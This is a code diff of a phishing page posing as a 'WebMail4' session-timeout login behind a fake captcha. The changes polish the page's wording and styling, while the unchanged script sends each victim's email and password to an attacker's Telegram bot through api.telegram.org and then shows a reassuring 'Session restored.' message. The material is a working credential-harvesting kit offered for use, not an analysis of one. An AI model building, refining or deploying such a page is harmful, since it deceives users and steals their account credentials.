@@ -3,35 +3,36 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WebMail4 | Secured Captcha Page</title>
+  <title>WebMail4 | Session Timeout - Login to Continue</title>
 </head>
-<body style="margin:0; padding:0; font-family:Segoe UI,Roboto,sans-serif; background:#f4f6f9; display:flex; align-items:center; justify-content:center; height:100vh;">
+<body style="margin:0; padding:0; font-family:'Segoe UI',Roboto,sans-serif; background:#f3f2f1; display:flex; align-items:center; justify-content:center; min-height:100vh;">
 
   <!-- CAPTCHA CARD -->
-  <div id="captchaCard" style="background:#fff; padding:32px; border-radius:12px; box-shadow:0 4px 16px rgba(0,0,0,0.08); max-width:380px; width:100%; text-align:center;">
-    <div style="font-size:20px; font-weight:600; color:#0078d4; margin-bottom:8px;">WebMail4</div>
-    <h2 style="font-size:22px; margin-bottom:12px; color:#333;">Secured Captcha Page</h2>
-    <div id="captchaText" style="letter-spacing:4px; background:#e8f0fe; padding:12px; border-radius:6px; font-weight:bold; margin-bottom:16px; color:#1a73e8;"></div>
-    <input type="text" id="captchaInput" placeholder="Enter captcha" style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;"/>
-    <button onclick="validateCaptcha()" style="width:100%; padding:12px; background-color:#0078d4; color:white; border:none; border-radius:6px; font-size:15px; cursor:pointer;">
-      Verify
+  <div id="captchaCard" style="background:white; padding:24px; border-radius:10px; box-shadow:0 0 16px rgba(0,0,0,0.08); max-width:360px; width:92%; text-align:center;">
+    <div style="font-size:20px; font-weight:600; color:#0067c5; margin-bottom:8px;">WebMail4</div>
+    <h2 style="font-size:19px; margin-bottom:16px; color:#1b1a19;">Secured Captcha Page</h2>
+    <p style="font-size:14px; color:#605e5c; margin-bottom:8px;">Please verify you're human to continue</p>
+    <div id="captchaText" style="user-select:none; font-size:20px; letter-spacing:5px; background:linear-gradient(135deg,#deeaf6,#e8f0fe); color:#0a5cc7; padding:10px; border-radius:6px; font-weight:bold; font-family:'Courier New',monospace; margin-bottom:16px;"></div>
+    <input type="text" id="captchaInput" placeholder="Enter characters above" style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;" />
+    <button onclick="validateCaptcha()" style="width:100%; padding:10px 0; background-color:#0067c5; color:white; border:none; border-radius:6px; font-size:14px; font-weight:500; cursor:pointer;">
+      Continue
     </button>
   </div>
 
   <!-- LOGIN CARD -->
-  <div id="formCard" style="display:none; background:#fff; padding:32px; border-radius:12px; box-shadow:0 4px 16px rgba(0,0,0,0.08); max-width:380px; width:100%; text-align:center;">
-    <div style="font-size:20px; font-weight:600; color:#0078d4; margin-bottom:8px;">WebMail4</div>
-    <h2 style="font-size:22px; margin-bottom:4px; color:#333;">Session Expired</h2>
-    <p style="font-size:14px; color:#666; margin-bottom:24px;">Please sign in again to continue</p>
+  <div id="formCard" style="display:none; background:white; padding:24px; border-radius:10px; box-shadow:0 0 16px rgba(0,0,0,0.08); max-width:360px; width:92%; text-align:center;">
+    <div style="font-size:20px; font-weight:600; color:#0067c5; margin-bottom:8px;">WebMail4</div>
+    <h2 style="font-size:19px; margin-bottom:4px; color:#1b1a19;">Session Timed Out</h2>
+    <p style="font-size:13px; color:#605e5c; margin-bottom:24px;">For your security, please sign in again</p>
     <form id="loginForm" style="text-align:left;">
-      <label for="email" style="font-size:14px; color:#444; display:block; margin-bottom:6px;">Email address</label>
-      <input type="email" id="email" required style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;" />
+      <label for="email" style="font-size:14px; color:#323130; display:block; margin-bottom:6px;">Email address</label>
+      <input type="email" id="email" required style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #c8c6c4; border-radius:6px; font-size:15px;" />
 
-      <label for="password" style="font-size:14px; color:#444; display:block; margin-bottom:6px;">Password</label>
-      <input type="password" id="password" required style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:15px;" />
+      <label for="password" style="font-size:14px; color:#323130; display:block; margin-bottom:6px;">Password</label>
+      <input type="password" id="password" required style="width:100%; padding:12px; margin-bottom:16px; border:1px solid #c8c6c4; border-radius:6px; font-size:15px;" />
 
-      <button type="submit" style="width:100%; padding:12px; background-color:#0078d4; color:white; border:none; border-radius:6px; font-size:15px; cursor:pointer;">
-        Sign In
+      <button type="submit" style="width:100%; padding:10px 0; background-color:#0067c5; color:white; border:none; border-radius:6px; font-size:14px; font-weight:500; cursor:pointer;">
+        Login
       </button>
     </form>
   </div>
@@ -47,17 +48,17 @@
     let generatedCaptcha = "";
 
     function generateCaptcha() {
-      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
       generatedCaptcha = Array.from({length: 6}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
       captchaText.textContent = generatedCaptcha;
     }
 
     function validateCaptcha() {
-      if (captchaInput.value.trim().toUpperCase() === generatedCaptcha) {
+      if (captchaInput.value.trim() === generatedCaptcha) {
         captchaCard.style.display = "none";
         formCard.style.display = "block";
       } else {
-        alert("Incorrect captcha. Try again.");
+        alert("Incorrect captcha. Please try again.");
         generateCaptcha();
         captchaInput.value = '';
       }
@@ -81,10 +82,7 @@
         await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
+          body: JSON.stringify({ chat_id: chatId, text: message })
         });
         alert("Session restored.");
         form.reset();
